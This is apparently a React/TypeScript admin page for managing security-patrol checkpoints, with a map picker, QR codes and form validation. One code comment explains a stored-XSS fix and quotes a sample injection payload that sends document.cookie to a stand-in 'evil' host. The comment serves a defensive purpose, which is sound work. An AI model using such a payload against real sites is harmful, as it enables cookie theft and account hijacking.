"use client";
import React, { useState, useEffect } from "react";
import { lokasiApi, checkpointsApi } from "@/lib/api";
import { statusColor, statusLabel } from "@/lib/formatters";
import { Modal } from "@/components/ui/Modal";
import { Pagination } from "@/components/ui/Pagination";
import { ConfirmDialog } from "@/components/ui/ConfirmDialog";
import { QRCodeImage } from "@/components/ui/QRCodeImage";
import { useToast } from "@/hooks/useToast";

export default function CheckpointPage() {
  const { toast } = useToast();
  const [loading, setLoading] = useState(true);
  const [data, setData] = useState<any[]>([]);
  const [lokasi, setLokasi] = useState<any[]>([]);
  const [modal, setModal] = useState(false);
  const [edit, setEdit] = useState<any>(null);
  const [del, setDel] = useState<any>(null);
  const [saving, setSaving] = useState(false);
  const [search, setSearch] = useState("");
  const [filterLok, setFilterLok] = useState("");
  const emptyForm = {
    nama: "",
    area: "",
    lokasi_id: "",
    latitude: "",
    longitude: "",
    radius: "15",
    qr_code: "",
    status: "active",
  };
  const [form, setForm] = useState(emptyForm);
  const [currentPage, setCurrentPage] = useState(1);
  const PAGE_SIZE = 15;
  const load = async () => {
    setLoading(true);
    try {
      setData(await checkpointsApi.list("all=true"));
    } catch (e: any) {
      toast(e?.message || "Gagal memuat checkpoint", "error");
    } finally {
      setLoading(false);
    }
    try {
      setLokasi(await lokasiApi.list());
    } catch (e: any) { toast(e?.message || "Gagal memuat data pendukung (lokasi/checkpoint/shift). Muat ulang halaman.", "warning"); }
  };
  useEffect(() => {
    load();
    // eslint-disable-next-line react-hooks/exhaustive-deps
  }, []);
  useEffect(() => { setCurrentPage(1); }, [search, filterLok]);
  useEffect(() => {
    const h = (e: MessageEvent) => {
      if (e.data?.t === "cp-map")
        setForm((f: any) => ({
          ...f,
          latitude: e.data.lat,
          longitude: e.data.lng,
        }));
    };
    window.addEventListener("message", h);
    return () => window.removeEventListener("message", h);
  }, []);
  const lokasiName = (id: string) =>
    lokasi.find((l: any) => l.id === id)?.nama || "-";
  const autoQR = (nama: string, lokId: string) => {
    const lok = lokasi.find((l: any) => l.id === lokId);
    const ln = (lok?.nama || "SITE").replace(/[^A-Z0-9]/gi, "").substring(0, 6);
    const cn = nama.replace(/[^A-Z0-9]/gi, "").substring(0, 8);
    const uid = Date.now().toString(36).toUpperCase().slice(-4);
    return `CP-${ln}-${cn}-${uid}`.toUpperCase();
  };
  const openNew = () => {
    setEdit(null);
    setForm(emptyForm);
    setModal(true);
  };
  const openEdit = (r: any) => {
    setEdit(r);
    setForm({
      nama: r.nama,
      area: r.area || "",
      lokasi_id: r.lokasi_id || "",
      latitude: String(r.latitude || ""),
      longitude: String(r.longitude || ""),
      radius: String(r.radius || 15),
      qr_code: r.qr_code || "",
      status: r.status,
    });
    setModal(true);
  };
  const save = async () => {
    if (saving) return;
    // [Audit 2B] Validasi di klien (sebelumnya lat/lng kosong dikirim sebagai 0,0
    // → checkpoint "di laut" dan scan patroli selalu di luar radius).
    const nama = form.nama.trim();
    const lat = parseFloat(form.latitude);
    const lng = parseFloat(form.longitude);
    const radius = parseInt(form.radius);
    if (!form.lokasi_id) return toast("Pilih lokasi/klien terlebih dahulu", "warning");
    if (nama.length < 2) return toast("Nama checkpoint minimal 2 karakter", "warning");
    if (!Number.isFinite(lat) || lat < -90 || lat > 90 || !Number.isFinite(lng) || lng < -180 || lng > 180 || (lat === 0 && lng === 0))
      return toast("Koordinat wajib diisi — klik pada peta atau isi latitude/longitude", "warning");
    if (!Number.isFinite(radius) || radius < 1 || radius > 5000) return toast("Radius harus 1–5000 meter", "warning");
    const qr = (form.qr_code || autoQR(nama, form.lokasi_id)).trim();
    if (!/^[A-Za-z0-9._:\-]{4,64}$/.test(qr)) return toast("Kode QR hanya huruf/angka/.-_: (4–64 karakter)", "warning");
    const payload = {
      ...form,
      nama,
      area: form.area.trim() || null,
      qr_code: qr,
      latitude: lat,
      longitude: lng,
      radius,
    };
    setSaving(true);
    try {
      if (edit) {
        await checkpointsApi.update(edit.id, payload);
        toast("Checkpoint diperbarui");
      } else {
        await checkpointsApi.create(payload);
        toast("Checkpoint ditambahkan");
      }
      setModal(false);
      load();
    } catch (e: any) {
      toast(e.message, "error");
    } finally {
      setSaving(false);
    }
  };
  const doDelete = async () => {
    if (saving) return;
    setSaving(true);
    try {
      await checkpointsApi.del(del.id);
      toast("Checkpoint dihapus");
      setDel(null);
      load();
    } catch (e: any) {
      toast(e.message, "error");
    } finally {
      setSaving(false);
    }
  };
  const filtered = data.filter(
    (r) =>
      (!filterLok || r.lokasi_id === filterLok) &&
      (!search || `${r.nama || ""} ${r.area || ""} ${r.qr_code || ""}`.toLowerCase().includes(search.toLowerCase())),
  );
  const pagedData = filtered.slice((currentPage - 1) * PAGE_SIZE, currentPage * PAGE_SIZE);
  return (
    <div>
      <div className="page-header">
        <h1 className="page-title">
          <i className="fas fa-map-marker-alt" />
          Checkpoint
        </h1>
        <button className="btn btn-primary" onClick={openNew}>
          <i className="fas fa-plus" /> Tambah
        </button>
      </div>
      <div className="section-card">
        <div className="filters-row">
          <div className="search-box">
            <i className="fas fa-search" />
            <input
              placeholder="Cari checkpoint..."
              value={search}
              onChange={(e) => setSearch(e.target.value)}
            />
          </div>
          <select
            className="form-select"
            style={{ width: "auto" }}
            value={filterLok}
            onChange={(e) => setFilterLok(e.target.value)}
          >
            <option value="">Semua Lokasi</option>
            {lokasi.map((l) => (
              <option key={l.id} value={l.id}>
                {l.nama}
              </option>
            ))}
          </select>
          <span className="muted">{filtered.length} checkpoint</span>
        </div>
        <table>
          <thead>
            <tr>
              <th>Nama</th>
              <th>Lokasi/Klien</th>
              <th>Area</th>
              <th>Koordinat</th>
              <th>Radius</th>
              <th>QR Code</th>
              <th>Status</th>
              <th>Aksi</th>
            </tr>
          </thead>
          <tbody>
            {pagedData.map((r) => (
              <tr key={r.id}>
                <td className="cell-ellipsis" title={r.nama}>
                  <strong>{r.nama}</strong>
                </td>
                <td className="cell-ellipsis" title={lokasiName(r.lokasi_id)}>{lokasiName(r.lokasi_id)}</td>
                <td className="cell-ellipsis-sm" title={r.area || "-"}>{r.area || "-"}</td>
                <td style={{ fontFamily: "monospace", fontSize: 11 }}>
                  {r.latitude?.toFixed?.(4)}, {r.longitude?.toFixed?.(4)}
                </td>
                <td>{r.radius}m</td>
                <td>
                  <div style={{ display: 'flex', flexDirection: 'column', gap: 4 }}>
                    <code style={{ fontSize: 10 }}>{r.qr_code}</code>
                    {/* BUG #6 (P2-5): QR rendered locally. */}
                    <QRCodeImage
                      data={r.qr_code || ""}
                      size={40}
                      alt="QR"
                      style={{ borderRadius: 4, background: 'var(--card)', padding: 2 }}
                    />
                  </div>
                </td>
                <td>
                  <span className={`badge badge-${statusColor(r.status)}`}>
                    {statusLabel(r.status)}
                  </span>
                </td>
                <td>
                  <div className="btn-group">
                    <button className="btn-icon" onClick={() => openEdit(r)} title="Edit">
                      <i className="fas fa-pen" />
                    </button>
                    <button
                      className="btn-icon"
                      onClick={() => setDel(r)}
                      style={{ color: "var(--danger)" }}
                      title="Hapus"
                    >
                      <i className="fas fa-trash" />
                    </button>
                  </div>
                </td>
              </tr>
            ))}
            {filtered.length === 0 && (
              <tr>
                <td colSpan={8} className="empty-row">
                  {loading ? "Memuat..." : "Tidak ada checkpoint" + (search || filterLok ? " untuk filter ini" : ". Klik Tambah untuk membuat checkpoint pertama.")}
                </td>
              </tr>
            )}
          </tbody>
        </table>
      <Pagination currentPage={currentPage} totalItems={filtered.length} pageSize={PAGE_SIZE} onPageChange={setCurrentPage} />
      </div>
      {modal && (
        <Modal
          title={`${edit ? "Edit" : "Tambah"} Checkpoint`}
          onClose={() => !saving && setModal(false)}
          footer={
            <>
              <button
                className="btn btn-outline"
                onClick={() => setModal(false)}
                disabled={saving}
              >
                Batal
              </button>
              <button className="btn btn-primary" onClick={save} disabled={saving}>
                <i className={`fas ${saving ? "fa-spinner fa-spin" : "fa-save"}`} /> {saving ? "Menyimpan..." : "Simpan"}
              </button>
            </>
          }
        >
          <div className="form-group">
            <label className="form-label">Lokasi / Klien *</label>
            <select
              className="form-select"
              value={form.lokasi_id}
              onChange={(e) => setForm({ ...form, lokasi_id: e.target.value })}
            >
              <option value="">-- Pilih Lokasi --</option>
              {lokasi.map((l) => (
                <option key={l.id} value={l.id}>
                  {l.nama}
                </option>
              ))}
            </select>
          </div>
          <div className="form-row">
            <div className="form-group">
              <label className="form-label">Nama Checkpoint *</label>
              <input
                className="form-input"
                value={form.nama}
                onChange={(e) => setForm({ ...form, nama: e.target.value })}
              />
            </div>
            <div className="form-group">
              <label className="form-label">Area</label>
              <input
                className="form-input"
                value={form.area}
                onChange={(e) => setForm({ ...form, area: e.target.value })}
                placeholder="cth: Gedung A"
              />
            </div>
          </div>
          <div className="form-group">
            <label className="form-label">📍 Pilih di Peta</label>
            <div
              style={{
                border: "1px solid var(--border)",
                borderRadius: 8,
                overflow: "hidden",
                height: 220,
                marginTop: 4,
              }}
            >
              {/*
                SECURITY (Stored XSS, Tahap 3):
                The values below feed an iframe srcDoc that gets parsed
                as HTML+JS. The original code interpolated
                `form.latitude || 0` and `form.longitude || 0` raw,
                which is a string from a text input. A value like
                  -0.5);fetch('https://evil/'+document.cookie);//
                would break out of the JS expression context and
                execute. The form's parseFloat on save and the DB's
                float column normally prevent persistence of a bad
                value, but we don't want the iframe to trust that
                chain — coerce to a finite Number right here at the
                point of interpolation.
              */}
              {(() => {
                const num = (v: any, def: number) => {
                  const n = Number(v);
                  return Number.isFinite(n) ? n : def;
                };
                const la = num(form.latitude, 0);
                const ln = num(form.longitude, 0);
                return (
                  <iframe
                    title="cp-map"
                    style={{ width: "100%", height: "100%", border: "none" }}
                    srcDoc={`<!DOCTYPE html><html><head><link rel="stylesheet" href="https://unpkg.com/leaflet@1.9.4/dist/leaflet.css"/><script src="https://unpkg.com/leaflet@1.9.4/dist/leaflet.js"><\/script><style>body{margin:0}#m{height:100vh}</style></head><body><div id="m"></div><script>var la=${la},ln=${ln};var m=L.map('m').setView([la||-0.5,ln||101.4],la?16:5);L.tileLayer('https://{s}.tile.openstreetmap.org/{z}/{x}/{y}.png',{maxZoom:19}).addTo(m);var mk=null;if(la&&ln)mk=L.marker([la,ln]).addTo(m);m.on('click',function(e){if(mk)m.removeLayer(mk);mk=L.marker([e.latlng.lat,e.latlng.lng]).addTo(m);window.parent.postMessage({t:'cp-map',lat:e.latlng.lat.toFixed(6),lng:e.latlng.lng.toFixed(6)},'*')})<\/script></body></html>`}
                  />
                );
              })()}
            </div>
          </div>
          <p className="muted" style={{ fontSize: 11, margin: '8px 0', padding: '8px 12px', background: 'var(--primary-light)', borderRadius: 8 }}>💡 Klik pada peta di atas untuk menentukan koordinat otomatis, atau isi manual di bawah</p>
          <div className="form-row">
            <div className="form-group">
              <label className="form-label">Latitude</label>
              <input
                className="form-input"
                type="number"
                step="any"
                value={form.latitude}
                onChange={(e) => setForm({ ...form, latitude: e.target.value })}
              />
            </div>
            <div className="form-group">
              <label className="form-label">Longitude</label>
              <input
                className="form-input"
                type="number"
                step="any"
                value={form.longitude}
                onChange={(e) =>
                  setForm({ ...form, longitude: e.target.value })
                }
              />
            </div>
            <div className="form-group">
              <label className="form-label">Radius (m)</label>
              <input
                className="form-input"
                type="number"
                value={form.radius}
                onChange={(e) => setForm({ ...form, radius: e.target.value })}
              />
            </div>
          </div>
          <div className="form-group">
            <label className="form-label">
              QR Code{" "}
              <small className="muted">
                (kosongkan = auto-generate unik berdasarkan nama lokasi)
              </small>
            </label>
            <div style={{ display: 'flex', gap: 10, alignItems: 'center' }}>
              <input
                className="form-input"
                value={form.qr_code}
                onChange={(e) => setForm({ ...form, qr_code: e.target.value })}
                placeholder="Otomatis jika kosong"
              />
              {form.qr_code && (
                /* BUG #6 (P2-5): QR rendered locally. */
                <QRCodeImage
                  data={form.qr_code}
                  size={40}
                  alt="QR Preview"
                  style={{ borderRadius: 4, background: 'var(--card)', padding: 2, border: '1px solid var(--border)' }}
                />
              )}
            </div>
          </div>
          <div className="form-group">
            <label className="form-label">Status</label>
            <div className="form-chip-row">
              {["active", "inactive"].map((s) => (
                <button
                  key={s}
                  className={`form-chip ${form.status === s ? "active" : ""}`}
                  onClick={() => setForm({ ...form, status: s })}
                >
                  {statusLabel(s)}
                </button>
              ))}
            </div>
          </div>
        </Modal>
      )}
      {del && (
        <ConfirmDialog
          busy={saving}
          title="Hapus Checkpoint?"
          msg={`"${del.nama}" akan dihapus. Rute patroli yang memuat checkpoint ini perlu diperbarui.`}
          onConfirm={doDelete}
          onCancel={() => setDel(null)}
        />
      )}
    </div>
  );
}
